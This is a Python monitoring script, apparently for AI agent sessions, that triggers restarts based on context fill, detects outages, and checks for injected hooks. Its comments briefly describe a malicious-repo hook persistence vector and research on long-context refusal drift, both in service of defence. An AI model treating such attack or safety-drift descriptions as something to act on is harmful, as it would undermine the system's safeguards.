#!/usr/bin/env python3
"""Context-fill monitor — auto-fire graceful restart on a Pantheon agent's session context-fill threshold.

Polls the named agent's latest session jsonl every 5 min; computes context-fill % from
the latest `message.usage` event; fires `tools/handoff_and_restart.sh` against
that agent's tmux session when the threshold is crossed. Per-agent cooldown
prevents re-fire loops.

Designed to run as a systemd user timer on the `claude-fallback` user (Recovery),
parameterized by `--agent <name>`. Cross-account access to each agent's jsonl
+ restart wrapper via Recovery's NOPASSWD-sudo into that agent's account.

Per T-0184 + T-0189 HO-locked decisions (threshold basis regrounded by T-1497):
  - Threshold: min(absolute degradation onset, safety-cap fraction × window) —
    500K / 0.70×window; see resolve_base_threshold_fraction() + constants block.
  - Detection: JSONL transcript probe.
  - Polling cadence: 5 min (timer).
  - Cooldown: 30 min post-restart (CONTEXT_FILL_COOLDOWN_SECONDS).
  - Generalization: --agent flag selects per-agent config from AGENT_CONFIG;
    pairs with systemd-template `pantheon-context-fill-monitor@<agent>.{service,timer}`.

Bail-and-poll design (mirrors ho_resumer.py): each cycle exits quickly. No
long sleep inside the process. Worst-case latency = one 5-min poll interval.

Per-agent config lives in AGENT_CONFIG below — adjacent to the read+fire
logic so that adding a new agent is a one-line dict entry. The script
trusts this dict for jsonl directory, sudo user, restart-service unit,
tmux pane, and systemctl mode.

Environment overrides (apply globally across agents):
  PANTHEON_STATE_DIR             — override state dir (default ~/.local/state/pantheon).
  CONTEXT_FILL_THRESHOLD         — LEGACY explicit fraction (msg 2360 knob):
                                   if set, BYPASSES the T-1497 min() trigger.
  CONTEXT_FILL_RESTART_ABSOLUTE_TOKENS / CONTEXT_FILL_SAFETY_CAP_FRACTION
                                 — override the min() terms (500_000 / 0.70).
  CONTEXT_FILL_IDLE_VELOCITY_TOKENS — idle velocity cut, absolute (31_000).
  CONTEXT_FILL_COOLDOWN_SECONDS  — override cooldown (default 1800).
  PANTHEON_CONTEXT_WINDOW        — global override of the advertised context
                                   window (default 1_000_000, Opus-class 1M).
                                   Per-agent windows come from AGENT_CONFIG
                                   (see below), not this env var.

Per-agent overrides (one channel: env var, falls back to AGENT_CONFIG entry):
  CONTEXT_FILL_PROJECTS_DIR_<AGENT>   — override an agent's jsonl directory.
                                        e.g. CONTEXT_FILL_PROJECTS_DIR_ORCHESTRATOR.
  AGENT_CONFIG[<agent>]["context_window"] — the agent's real advertised window;
                                        set for non-1M models (Haiku 4.5=200_000)
                                        so the fill trigger fires (T-1289).
  AGENT_CONFIG[<agent>]["restart_absolute_tokens"] — per-agent absolute
                                        degradation-onset calibration; REQUIRED
                                        below the 333K floor (T-1497).

Exit codes:
  0 — clean bail (below threshold, in cooldown, no jsonl, or unparseable)
      OR successful fire.
  1 — fire was attempted but handoff_and_restart.sh exited non-zero.
  2 — argv error (unknown --agent, missing flag). Also used by --report
      (T-2709) for a report-path error (missing jsonl / no usable usage
      event): --report is a separate READ-ONLY path — it intercepts before
      the monitor/remediation loop below and can never fall through into it.
"""

from __future__ import annotations

import argparse
import getpass
import json
import os
import pwd
import re
import shlex
import subprocess
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone
from pathlib import Path

try:  # run-as-script (python3 tools/context_fill_monitor.py): tools/ on sys.path[0]
    from agent_role_map import instance_binding as _instance_binding
    from agent_role_map import control_plane_consume_service as _control_plane_consume_service
except ImportError:  # run-as-package (import tools.context_fill_monitor)
    from tools.agent_role_map import instance_binding as _instance_binding
    from tools.agent_role_map import control_plane_consume_service as _control_plane_consume_service

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_DEFAULT_STATE_DIR = Path.home() / ".local" / "state" / "pantheon"

# Tombstone filename pattern for agents that use tombstone-write instead of
# direct restart (currently only Recovery). Drained by pantheon-restart-drain timer.
# Per ORG-020 Phase 1.
TOMBSTONE_FILENAME_PATTERN = "restart_requested_{agent}.json"

# Restart trigger — REGROUNDED on its true bases (T-1497 part B, 2026-07-02).
#
# The old form was a single fraction (CONTEXT_FILL_RESTART_THRESHOLD = 0.50 ×
# window). The operator's correction (T-1497): that 0.50 was calibrated against a
# ~1M-window agent (msg 2360, 2026-06-03, lowering the prior T-0184 60%), i.e.
# its real basis is ~500K ABSOLUTE tokens — context-rot degradation-onset
# territory (Chroma Context Rot; NoLiMa: degradation tracks absolute input
# length with model-family-dependent slope, NOT fraction-of-window). Applying
# it as a per-window fraction misrepresented that basis: a 512Ki agent
# restarting at 262K is nowhere near the onset the number encodes.
#
# The regrounded trigger is the MINIMUM of two constraints with different bases:
#
#   trigger_tokens = min(CONTEXT_FILL_RESTART_ABSOLUTE_TOKENS,          # (1)
#                        CONTEXT_FILL_SAFETY_CAP_FRACTION × window)     # (2)
#
# (1) ABSOLUTE degradation onset — 500_000 for the frontier-class (Opus/Fable)
#     agents this monitor watches; the operator's msg-2360 policy point re-expressed
#     on its true basis. Per-model-CLASS: a future long-running small-model
#     agent needs its own (much lower) number via the per-agent
#     "restart_absolute_tokens" AGENT_CONFIG field — see the small-window rule
#     below. (T-1289/T-1446 provenance: NoLiMa shows mini-class collapses 3-6×
#     harder than frontier at 32K; the Haiku-4.5-SPECIFIC number stays OPEN —
#     T-1269/1273. NoLiMa's ~4-8K effective-reasoning budget is a separate D11
#     dispatch-sizing lever, not this monitor's concern.)
# (2) WINDOW-RELATIVE handoff-safety cap — the restart must fire far enough
#     below the agent's HARD ceiling (harness force-compaction: opus-512Ki
#     observed ~466-521K ≈ 0.89-0.99 of window, T-1357) that arc turns landing
#     between 5-min polls can't overshoot before the graceful restart wins the
#     race. 0.70 leaves ≥0.19×window to the worst-observed onset fraction:
#     512Ki → trigger 367K, ~99K (≈2.5 arc turns @40K) under the 466K floor.
#
# Fleet arithmetic: 1M windows (fable promo / opus[1m]) → (1) binds at 500K
# (identical to the pre-regrounding live behavior). 512Ki (standard-opus
# revert) → (2) binds at 367K — deliberately LATER than the old 0.50×512Ki
# = 262K, which was the fraction-misapplication artifact this change removes.
#
# SMALL-WINDOW RULE (load-bearing, enforced by --validate): below ~333K the
# min() gives <2.5-turn margins to a ~0.89×window compaction onset, and the
# idle-ceiling invariant disables the idle feature (see
# effective_fill_threshold). Any AGENT_CONFIG entry with context_window <
# SMALL_WINDOW_CALIBRATION_FLOOR_TOKENS must therefore carry an explicit
# per-agent "restart_absolute_tokens" calibration (e.g. Haiku-class ~60-80K
# per the T-1289 direction) — --validate fails loudly otherwise.
#
# KNOWN UNCOVERED RESIDUAL — refusal-drift (specialist T-1575 awareness, 2026-07-06,
# LOW confidence): this calibration protects against long-context DEGRADATION
# (~500K onset). A distinct failure mode, long-context REFUSAL-DRIFT (the
# model's own safety behavior drifting as context grows), has a reported ~100K
# onset in non-Claude models (arXiv 2512.02445); the closest Claude analog
# (arXiv 2602.08874, Sonnet/Haiku 4.5) only tested to 64K — the 64K-367K+ band
# we operate in is UNTESTED for Claude. Being model-internal, it is NOT
# mitigated by the restart/file-resident-governance defense (re-injecting
# CLAUDE.md doesn't fix the model's own drift). Unverified in practice (no
# spurious refusals observed incl. very long sessions; the analog's threat
# model is adversarial-compositional, ours is passive) → recorded as residual,
# no floor change. Revisit if spurious refusals correlate with high fill.
#
# Env overrides (call-time): CONTEXT_FILL_THRESHOLD (LEGACY, msg-2360 knob) —
# if set, it is an explicit operator fraction that BYPASSES the min() entirely;
# CONTEXT_FILL_RESTART_ABSOLUTE_TOKENS and CONTEXT_FILL_SAFETY_CAP_FRACTION
# override the individual terms. See resolve_base_threshold_fraction().
CONTEXT_FILL_RESTART_ABSOLUTE_TOKENS = 500_000
CONTEXT_FILL_SAFETY_CAP_FRACTION = 0.70
SMALL_WINDOW_CALIBRATION_FLOOR_TOKENS = 333_000

# Idle-aware ceiling (T-1491, the operator 2026-07-01 "2, but they can hit 90%"): a
# GENUINELY-IDLE session may ride to this HIGHER fill before a protective restart.
# Rationale: the tight base margin exists only so a big ARC turn (40k+/turn)
# can't overshoot the hard ceiling mid-poll. An idle session isn't doing big
# turns, so restarting it at the base trigger is pure waste — orchestrator was
# restarting ~8x/17h overnight on slow idle drift, interrupting nothing.
#
# BASIS (re-derived, T-1497 part B): the ceiling is deliberately a FRACTION —
# it is overshoot-protection relative to the hard ceiling (≈ the window), NOT a
# degradation number, so it scales with the window where the base trigger does
# not. An idle session past the absolute degradation onset is doing no
# reasoning, so rot doesn't bite; the moment it wakes, measured velocity
# exceeds the idle cut, the threshold drops back to base, and the restart fires
# on the next poll. ACCEPTED RESIDUAL (documented, not changed — 0.90 is
# the operator's explicit T-1491 number): on a 512Ki window, 0.90 = 471,859 sits
# INSIDE the observed 466-521K compaction band, so a post-revert idle session
# can be force-compacted before the idle ceiling fires — that costs handoff
# quality (compacted context), not safety (the session survives).
#
# OBSERVED LIVE — big-turn-wake overshoot (specialist, 2026-07-07 20:15Z): the
# residual's other face. Specialist idle-rode to 69.6% (696K), then ONE turn loaded
# ~305K tokens inside a single 5-min poll window → next read was 100.04%
# (1,000,446/1M) — past the window before any threshold could see it. The
# safety invariant bounds IDLE drift (≤31K/poll), not a first arc turn after
# waking; no poll-based threshold can catch an intra-turn jump of that size at
# high fill. Outcome: fired at first sight, clean handoff + restart, session
# survived — the accepted-residual cost, realized and absorbed. Data point for
# any future re-derivation: single research-dispatch turns can be ~300K+, so
# idle-riding above ~(window − 350K) carries real overshoot odds; one instance
# is not a pattern — tune only if this recurs.
#
# "Idle" = recent per-poll fill VELOCITY below CONTEXT_FILL_IDLE_VELOCITY_TOKENS,
# measured over the same-jsonl history ring. The cut is ABSOLUTE tokens (T-1497
# part B — its basis is turn SIZES, which don't scale with the window):
# keep-going bumps ≤ ~26K < 31K < real arc turns ≥ ~39K. The pre-regrounding
# form (0.06 × window) encoded the same ~31K on the 512Ki window it was
# calibrated on, but on a 1M window 0.06 = 60K silently misclassified real 40K
# arc turns as idle. Known limitation (pre-existing at either basis): a single
# ~40K turn straddling a poll boundary can read as two ~20K deltas → idle.
# When velocity is UNKNOWN (warming up / rotated jsonl) we keep the BASE
# threshold — raise ONLY on CONFIRMED idle (mirrors the healthy-idle guard:
# never act on an ambiguous read).
# SAFETY INVARIANT enforced in effective_fill_threshold():
# (1 - idle_threshold) × window > velocity_tokens, so one poll-interval's max
# idle-growth can't overshoot the hard ceiling from the idle ceiling. COUPLING:
# with the 0.90 ceiling and 31K cut, the invariant refuses — i.e. the idle
# feature silently stays at BASE, fail-safe — for any window ≤ 310K (exactly
# 310_000 also refuses: strict inequality). Small-window agents are covered by
# the SMALL_WINDOW_CALIBRATION_FLOOR_TOKENS validation rule above.
# Set CONTEXT_FILL_IDLE_THRESHOLD == base to DISABLE.
CONTEXT_FILL_IDLE_THRESHOLD = float(
    os.environ.get("CONTEXT_FILL_IDLE_THRESHOLD", "0.90")
)
CONTEXT_FILL_IDLE_VELOCITY_TOKENS = int(
    os.environ.get("CONTEXT_FILL_IDLE_VELOCITY_TOKENS", "31000")
)
# T-1497 part C (the operator TG 5385, 2026-08-07): the idle ceiling above is a RELATIVE
# fraction (0.90) set in the 512Ki era — on the now-default 1M window it balloons to
# 900K, a ~400K idle grace above the 500K base vs the ~100K it was designed for. The
# BASE threshold was regrounded to ABSOLUTE (part B, min(500K, cap×window)); the idle
# ceiling was not. Reground it the same way: cap the idle GRACE (ceiling − base) to a
# fixed ABSOLUTE token count so it no longer scales with the window. 0.90 stays the
# UPPER bound (effective_fill_threshold takes the min), so small/historical windows
# are unchanged — the cap only binds on large windows where the relative gap grew.
# 150K restores the ~100–150K idle grace the 512Ki-era 0.90 gave. Env-tunable.
CONTEXT_FILL_IDLE_GRACE_TOKENS = int(
    os.environ.get("CONTEXT_FILL_IDLE_GRACE_TOKENS", "150000")
)

# Cooldown: 30 min post-restart. Per T-0184 HO-locked decision (4) — prevents
# re-fire loop after a successful restart while the new session warms.
CONTEXT_FILL_COOLDOWN_SECONDS = 30 * 60

# Default advertised context window: 1M tokens (Opus-class). Per-agent windows
# override this via AGENT_CONFIG[<agent>]["context_window"] — see
# resolve_context_window(). Agent windows are NOT uniform: orchestrator + specialist run
# STANDARD Opus 4.8 (`--model claude-opus-4-8`, ~512Ki window); recovery runs the 1M
# variant (`claude-opus-4-8[1m]`). T-1357: orchestrator/specialist's window had been left at
# the 1M default, so the 0.50 trigger sat at 500k — ABOVE their ~466-520k harness
# auto-compaction point, so the harness always compacted first and the clean
# restart never fired. Standard-Opus agents pin context_window below.
# (A future non-1M agent, e.g. Haiku 4.5 = 200_000, sets its own override too.)
# ⚠️ STANDARD_OPUS_CONTEXT_WINDOW IS HISTORICAL — do NOT "revert" orchestrator/specialist to it.
# project_fable_bump's revert step 2 and T-2134's Ask both still say to set
# orchestrator+specialist context_window back to this value once fable is gone. That
# instruction is now OBSOLETE AND HARMFUL, and was written when the fleet's
# non-fable model was opus-4-8. Doing it today would lower their restart trigger
# from 500_000 to ~367_002 tokens, because the trigger is
# min(RESTART_ABSOLUTE_TOKENS, SAFETY_CAP_FRACTION × window) = min(500_000, 0.70×w):
#     w = 1_000_000  ->  min(500_000, 700_000) = 500_000   (50% of window)
#     w =   524_288  ->  min(500_000, 367_002) = 367_002   (70% of window)
# i.e. a 27% earlier trigger and materially more frequent restarts for the two
# busiest agents, for no reason. The live fleet runs an Opus-class model whose
# advertised window is 1M, so DEFAULT_CONTEXT_WINDOW_TOKENS is CORRECT for
# orchestrator/specialist — that is why they carry it. Confirmed against observed behaviour:
# specialist's context-fill restarts report "fill 51% >= threshold 50%", which is
# exactly trigger 500_000 over a 1M window. Kept as a named constant only because
# it documents the empirical 512Ki-era measurement; it has no current consumer.
STANDARD_OPUS_CONTEXT_WINDOW = 524_288  # 512Ki — empirical (opus-4-8 era): orchestrator/specialist fill readings asymptoted to ~519-521k (99%) and never exceeded it
DEFAULT_CONTEXT_WINDOW_TOKENS = 1_000_000

# ---------------------------------------------------------------------------
# Wedge/staleness detection (T-0857)
# ---------------------------------------------------------------------------
#
# The absolute fill-threshold check is BLIND to a wedged session: an agent stuck
# on an interactive modal (e.g. "Resume from summary?") stops emitting usage
# events, so its token count FREEZES and the monitor reads the same fill on every
# poll — below threshold → never fires. 2026-06-05: specialist sat dead ~2h with fill
# frozen at exactly 163742 tokens = 16.37% across 30+ min of polls.
#
# Detection: if the integer token count is identical across N consecutive polls
# (same session jsonl), the session is not progressing. A genuinely-idle HEALTHY
# agent also has frozen fill, so we confirm with a read-only pane check
# (verify_startup.sh) and fire ONLY when the pane is affirmatively WEDGED. The
# recovery reuses the existing threshold fire paths (tombstone / fire_restart).
#
# Ships DARK (PANTHEON_STALENESS_ENABLED default-off) pending a supervised
# first-fire per agent — the first-deploy restart-loop guard.
STALENESS_ENABLED = os.environ.get("PANTHEON_STALENESS_ENABLED", "").strip().lower() in (
    "1", "true", "yes", "on",
)
# N consecutive identical readings (~N*5 min wedged) before firing. N=4 ≈ 15 min
# of zero progress — a large improvement over the ~2h specialist outage while staying
# conservative against false positives.
STALENESS_POLLS = int(os.environ.get("CONTEXT_FILL_STALENESS_POLLS", "4"))
# Distinct tombstone/restart reason so wedge restarts read clearly in logs and
# drain with the right semantics (restart_drain handles wedge_staleness).
STALENESS_REASON = "wedge_staleness"
# verify_startup.sh lives beside this monitor (Recovery's clone). The monitor always
# runs on Recovery's account; verify_startup sudo's internally for cross-account
# pane capture, so one path serves all agents.
VERIFY_STARTUP_BIN = str(Path(__file__).resolve().parent / "verify_startup.sh")
# Read-only pane check must not hang the poll cycle.
VERIFY_STARTUP_TIMEOUT_SECONDS = 30

# ---------------------------------------------------------------------------
# API-health watchdog (T-0510)
# ---------------------------------------------------------------------------
#
# Detects the "alive-but-erroring" failure mode behind the 2026-05-21 Recovery
# outage: a session that stays systemd-active but 400s on EVERY API request
# for hours ("400 role 'system' is not supported on this model", 162 errors
# over ~14h). The crash-restart (Restart=always) never catches it because the
# process doesn't exit; the context-fill monitor never catches it because no
# new usage is recorded. On a sustained run of recent API-error records we
# write a tombstone with reason=api_health_force; restart_drain force-restarts
# via handoff_and_restart.sh --skip-ack (a 400ing session can't write a
# handoff). Per the operator's option-B steer (msg_1707): the wrapper still owns
# systemctl — no parallel restart path.

# Tombstone reason for an api-health force restart (consumed by restart_drain).
API_HEALTH_FORCE_REASON = "api_health_force"

# Status codes that warrant a force-restart: request-shape errors a FRESH
# session clears. v1 = {400} only (the actual incident). 408/429/5xx are
# upstream/transient — a restart won't help and would needlessly lose context
# — so they END the error run rather than extend it. Widen via
# CONTEXT_FILL_API_HEALTH_STATUSES (comma-list) once other clearable statuses
# are observed.
API_HEALTH_FORCE_STATUSES = frozenset({400})

# Fire only on a leading run of >= this many consecutive force-worthy errors...
API_HEALTH_MIN_ERROR_RUN = 5
# ...spanning >= this many seconds (guards against a fast retry burst)...
API_HEALTH_MIN_RUN_SPAN_SECONDS = 10 * 60
# ...whose newest error is within this many seconds of now (guards against
# firing on a STALE run from a session that has since gone quiet / recovered).
API_HEALTH_RECENCY_SECONDS = 10 * 60

# Cooldown between api-health force-restarts. Deliberately SHORTER than the
# context-fill cooldown and tracked in its OWN state file: if the fresh session
# is ALSO poisoned we want to retry on a ~10 min cadence, not be locked out for
# the 30 min context-fill cooldown — but not loop every 5 min poll either.
API_HEALTH_COOLDOWN_SECONDS = 10 * 60

# Lines from the jsonl tail to scan for the error run.
API_HEALTH_TAIL_LINES = 200

# Default-OFF, enabled via PANTHEON_API_HEALTH_ENABLED=1 (typically a systemd
# drop-in). Mirrors the PANTHEON_RESTART_DRAIN_ENABLED opt-in pattern: a
# force-restart skips the handoff (loses unsaved context), so — like ORG-020's
# context-fill monitor — it stays disabled until a SUPERVISED first-fire proves
# the path end-to-end, then the flag is flipped on. Two independent gates
# remain: this flag (detection writes the tombstone) and the drain's own
# PANTHEON_RESTART_DRAIN_ENABLED (drain consumes it).
API_HEALTH_DEFAULT_ENABLED = False

# --- Model-outage detection (T-1126 / from incident T-1125) ---
# A DISTINCT error class from the 400 force-restart path: a session pinned to a
# REMOVED or inaccessible --model 404s on every request ("model_not_found" /
# "may not have access"). A force-restart does NOT fix this — re-launching
# re-pins the same dead model and 404s again (restart loop). The fix is a MODEL
# CHANGE (a human edits --model), so model-outage detection routes to an ALERT
# (to Recovery, who escalates), NEVER a force-restart. Reuses detect_sustained_api_errors
# with these statuses. Signature confirmed in the T-1125 jsonls:
# isApiErrorMessage:true + apiErrorStatus:404 + model_not_found body.
MODEL_OUTAGE_STATUSES = frozenset({404})
# Longer cooldown than api-health: the alert is low-harm and a removed model
# stays removed until a human acts, so re-alerting every 10 min would be spam.
MODEL_OUTAGE_COOLDOWN_SECONDS = 60 * 60
MODEL_OUTAGE_ALERT_LABEL = "model-outage"
# Ship-dark like api-health: alert-only, but a NEW detector still gets a
# SUPERVISED first-fire before going live (per T-1126). Armed per-agent via
# PANTHEON_MODEL_OUTAGE_ENABLED=1 (systemd drop-in). Default OFF → committing
# this detector is inert everywhere until the supervised enable.
MODEL_OUTAGE_DEFAULT_ENABLED = False

# --- Auth-outage detection (T-1223 / from the 2026-06-20→22 401 outage) ---
# A DISTINCT class from the 400 force-restart and 404 model-outage paths: a
# session whose OAuth credential cannot authenticate 401s on every request
# ("Invalid authentication credentials"). A force-restart does NOT fix it —
# relaunching re-inherits the same dead credential and 401s again. The fix is a
# RE-LOGIN (browser OAuth — the operator), so this routes to an ALERT, NEVER a restart.
# The outage hid ~3 days because 401 was in NO detection set
# (API_HEALTH_FORCE_STATUSES={400}); this closes that gap. Complements
# credential_expiry_monitor (which catches the file-readable empty-refresh case
# pre-emptively); this catches the RUNTIME case, incl. a present-but-revoked
# refresh token the file cannot reveal.
AUTH_OUTAGE_STATUSES = frozenset({401})
# Wider recency than api-health's 10 min: during the real outage the keep-going
# injector poked each agent every ~15 min, so the newest 401 can sit >10 min old
# between pokes. A dead credential never self-recovers, so widening is SAFE — the
# leading-run BREAKER (a single successful response ends the run) is the true
# recovered-guard, not the recency window. 45 min reliably spans the poke cadence.
AUTH_OUTAGE_RECENCY_SECONDS = 45 * 60
# A dead credential stays dead until a human re-logs in, so a 6h re-alert cadence
# (not 10 min) avoids spam while still nagging.
AUTH_OUTAGE_COOLDOWN_SECONDS = 6 * 60 * 60
AUTH_OUTAGE_ALERT_LABEL = "auth-outage"
# Unlike the restart-adjacent paths, this is pure-alert with minimal blast radius
# (one Telegram to the operator), AND the incident proves the missing detection IS the
# harm — so it ships ENABLED by default (the same-day credential_expiry_monitor
# sibling also ships on). Disable via PANTHEON_AUTH_OUTAGE_ENABLED=0. The
# min-run/span/recency guards keep false positives negligible.
AUTH_OUTAGE_DEFAULT_ENABLED = True

# --- Two-observation persistence gate for the error detectors (T-2607 PART 1) ---
# The three error detectors (api-health / model-outage / auth-outage) each drive
# force-restart or alert recovery tooling off detect_sustained_api_errors. That
# function already requires a min-RUN of errors within one transcript read, but a
# single POLL that happens to catch such a run (a transient upstream blip landing
# across one 5-min window) would fire on ONE observation. A persistence gate makes
# a fire require the condition to survive from one poll into the NEXT — a moment vs
# a state — modeled on inbox_consumer._check_pane_wedge_persistent.
#
# The two-observation property is guaranteed STRUCTURALLY by _check_error_persistent:
# the first sighting only WRITES the first-seen marker and returns "not yet", so a
# single observation can never fire. ERROR_PERSIST_SECONDS is the cadence-independent
# time-FLOOR on top of that. It is set just BELOW the nominal 5-min poll cadence so
# the second consecutive-poll sighting (~300s later) reliably clears it even under
# timer jitter — the same sub-cadence-floor reasoning the wedge model documents.
# (Filed guidance said "> one poll cadence"; taken literally against a 300s cadence
# that would demand a THIRD sighting and break the ticket's own two-observation
# acceptance test, so the floor lives just under cadence while the structural
# first-sighting-never-fires branch delivers the ">1 poll of persistence" intent.)
# Override via ERROR_PERSIST_SECONDS. Direction is fail-safe: the gate only DELAYS a
# fire by at most one poll and CLEARS on any negative detect, so it can never
# suppress a genuinely sustained error (the "a wedge that never fires" failure mode).
ERROR_PERSIST_SECONDS = int(os.environ.get("ERROR_PERSIST_SECONDS", str(4 * 60)))

# --- Spend-limit wedge (2026-06-26 — Orchestrator+Specialist caught when the monthly limit was
# $10) ---. Hitting the monthly spend limit pops a BLOCKING /rate-limit-options TUI
# modal ("You've hit your monthly spend limit · raise it at claude.ai/settings/usage").
# It is NOT an API error in the session JSONL, so api-health/model-outage/auth-outage
# are all structurally blind to it — only a PANE scrape sees it. Raising the limit is
# the operator's account action (claude.ai/settings/usage), so this is a direct-to-operator
# alert, same operator-must-act class as the auth-outage / credential carve-out. Ships
# ON; disable via PANTHEON_SPEND_LIMIT_ENABLED=0. Lowercased substring match on the
# captured pane.
SPEND_LIMIT_SENTINEL = "monthly spend limit"
SPEND_LIMIT_ALERT_LABEL = "spend-limit"
SPEND_LIMIT_COOLDOWN_SECONDS = 6 * 60 * 60
SPEND_LIMIT_DEFAULT_ENABLED = True

# --- Capability-cap wedge, JSONL variant (T-1980 — 2026-07-23 orchestrator Fable-5 cap) ---
# BEHAVIOR CHANGED since the 2026-06-26 pane-modal above: the cap now surfaces as a
# non-blocking, per-turn API ERROR in the JSONL — type:assistant, isApiErrorMessage:
# true, apiErrorStatus:429, content "You've hit your monthly spend limit ... keep
# using Fable 5 or switch models to continue". The session looks idle (pane at a
# clean prompt) but every input silently returns this error. T-2290 CORRECTION
# (2026-07-29): this does NOT "never self-resolve" — the message says "monthly
# spend limit" but the binding constraint is the CURRENT TIME WINDOW (the operator),
# and it clears on its own when the window rolls. Measured: orchestrator/metis/atlas
# each lost ~2h and all resumed unaided. The detection is still right — a capped
# seat is invisible without it, the wrong-layer-GREEN class applied to liveness
# (process-up proxied working while the capability was gone; orchestrator sat
# undetected) — but the REMEDIATION guidance was wrong and cost an escalation. The pane-scrape
# above is FRAGILE for this shape: the error text scrolls out of the visible pane
# between the response and the next monitor tick, so it misses most ticks. This
# JSONL detector is the reliable complement — the transcript durably records every
# error. Content-ANCHORED (not status alone): a bare 429 is a transient rate-limit
# that self-resolves; only the spend/usage-limit CONTENT signature is the non-
# recoverable cap. Routes to RECOVERY (unlike the modal's direct-to-operator): with the
# T-1980 stepper Recovery CAN remediate (switch to opus, the no-spend path) — the operator's
# raise-the-limit is the alternative Recovery escalates if wanted.
CAPABILITY_CAP_STATUSES = frozenset({429})
_CAPABILITY_CAP_CONTENT_RE = re.compile(
    r"spend limit|usage limit|switch models|/usage-credits|weekly limit", re.IGNORECASE
)
# A single cap error IS the wedge (it repeats on every input), but require a short
# run + recency to shrug off a one-off anomaly / a stale frozen transcript. The
# leading-run BREAKER (any successful assistant turn) is the true recovered-guard.
CAPABILITY_CAP_MIN_RUN = 2
CAPABILITY_CAP_RECENCY_SECONDS = 45 * 60  # spans the ~15-min keep-going poke cadence
CAPABILITY_CAP_COOLDOWN_SECONDS = 6 * 60 * 60
CAPABILITY_CAP_ALERT_LABEL = "capability-cap"
# Ships ON, same reasoning as auth-outage: the 2026-07-23 incident proves the
# missing detection IS the harm, it's alert-only (low blast radius), and the
# content anchor keeps false positives negligible. Disable via
# PANTHEON_CAPABILITY_CAP_ENABLED=0.
CAPABILITY_CAP_DEFAULT_ENABLED = True

# --- Consent-fallback cap, SYSTEM-record variant (T-1980 — 2026-07-24 Fable-5 credits cap) ---
# A SECOND, distinct fable-cap signal, verified identical across 5 recovery sessions
# 2026-07-24. Unlike the isApiErrorMessage:429 ASSISTANT record above (the monthly-
# SPEND cap, which WEDGES the session), the fable weekly-CREDITS cap surfaces as a
# single SYSTEM record:
#   {type:system, subtype:model_consent_fallback, level:warning,
#    originalModel:"claude-fable-5", fallbackModel:"claude-opus-4-8[1m]",
#    content:"Switched to Opus 4.8 ... Fable 5 requires usage credits - /model to change"}
# and the HARNESS AUTO-SWITCHES the live session to the fallback model (it self-
# recovers after the consent stall). detect_capability_cap is BLIND to it twice over:
# it skips system records, AND the content doesn't match _CAPABILITY_CAP_CONTENT_RE.
# The risk here is NOT a wedge (the session is running, on opus) — it is DURABILITY:
# the supervisor --model pin still points at the capped model, so the NEXT restart
# respawns capped and re-stalls (bugs/supervisor-launch-flag-outranks-settings-json-
# on-model-pin.md). The alert is therefore an ACTION-NUDGE ("verify the pin"), NOT a
# wedge alarm — routed to RECOVERY (the pin rewrite is Recovery's remediation).
_CONSENT_FALLBACK_SUBTYPE = "model_consent_fallback"
# The capped-tier model pins whose consent-fallback is worth nudging on.
_CONSENT_FALLBACK_CAPPED_MODELS = frozenset({"claude-fable-5"})
CONSENT_FALLBACK_COOLDOWN_SECONDS = 6 * 60 * 60
CONSENT_FALLBACK_ALERT_LABEL = "consent-fallback"
# Ships ON, same reasoning as the capability-cap alert: alert-only, low blast radius,
# subtype+originalModel anchored so false positives are negligible. Disable via
# PANTHEON_CONSENT_FALLBACK_ENABLED=0.
CONSENT_FALLBACK_DEFAULT_ENABLED = True

# T-0761 component 5: repo-audit tripwire ships dark by default.
# Armed per-agent via PANTHEON_REPO_AUDIT_ENABLED=1 (systemd drop-in) once the
# T-0761 enforcement regime is active and tickets carry repos: fields.  Until
# then, merging dark prevents premature noise on every poll cycle.
REPO_AUDIT_DEFAULT_ENABLED = False

# Path to the canonical restart wrapper. Lives in the `claude` account's
# pantheon-config clone (per CLAUDE.md graceful-restart pin); read+exec via
# sudo into the per-agent sudo_user.
HANDOFF_RESTART_BIN = "/home/claude/pantheon-config/tools/handoff_and_restart.sh"

# Subprocess timeouts.
JSONL_PROBE_TIMEOUT_SECONDS = 30
RESTART_INVOCATION_TIMEOUT_SECONDS = 10 * 60

# --- Hook-allowlist security check (T-0536) -------------------------------
# Detect injected Claude Code auto-run hooks — the Mini Shai-Hulud persistence
# vector (T-0424/T-0448): a malicious repo plants a `SessionStart` hook in
# `.claude/settings.json` that re-detonates on session open. We RELY on
# SessionStart hooks, so an injected one is otherwise invisible. Every cycle we
# read the agent's settings.json hooks (all events) and compare the script
# basenames they invoke against a per-agent allowlist; any deviation alerts Recovery.
#
# Read-only + alert-only (NO auto-remediation — a possible compromise is never
# auto-"fixed"; every deviation surfaces). Default-ON with a kill-switch, unlike
# the api-health gate, because it takes no destructive action.
HOOK_CHECK_ENABLED_ENV = "PANTHEON_HOOK_CHECK_ENABLED"  # set to 0/false to disable
# Allowlist = the verified-clean 2026-05-22 set (T-0536), keyed by the basename
# of the script each hook invokes (robust to path/arg differences). Built from a
# FULL hook inventory across ALL events (not just SessionStart) — the supervised
# first-fire caught that orchestrator carries legit hooks on PreToolUse/Stop/SubagentStop/
# StopFailure too. When a legit hook is added to any agent, add its basename here.
HOOK_ALLOWLIST = {
    "recovery": {
        "telegram-reply-gate.py",  # Stop hook — block a telegram-inbound turn ending without the reply tool (T-2188, operator-directed; recovery-first soak 2026-07-28)
        "handoff-auto-read.sh",   # SessionStart auto-read
        "act-vs-ask-gate.py",     # PreToolUse act-vs-ask gate on the telegram reply tool (2026-06-05, operator-approved)
        "verify-startup-boot.sh", # SessionStart boot-health self-check (T-1099, committed f5133479; allowlist sync 2026-06-11)
        "mcp-list-guard.py",      # PreToolUse(Bash) guard vs `claude mcp list` while poller live (T-0996/T-1000 deploy 2026-06-12)
        "verify-hook-integrity.sh",  # SessionStart hook content-integrity check vs canonical (T-1284/T-1287 recovery rollout; Miasma persistence-vector defense)
        "ensure-hooks-active.sh",  # SessionStart auto-repair of core.hooksPath (T-1216 option B, the operator 2026-07-01 TG4512; self-heals the 6/09 silent-drift)
        "background-pipe-gate.py",  # PreToolUse(Bash) guard vs background cmds piped through head/tail/grep — eats exit code + evidence (T-1907; T-0649 pipeline landing, recovery-first soak)
        "urgent-mail-inject.py",  # PreToolUse(*) urgent-mail preempt — inject URGENT additionalContext when inbox/.urgent_pending present (T-1641 Phase-2, supervised-first-fire on recovery 2026-08-05, operator-directed TG6982/6993)
    },
    "orchestrator": {
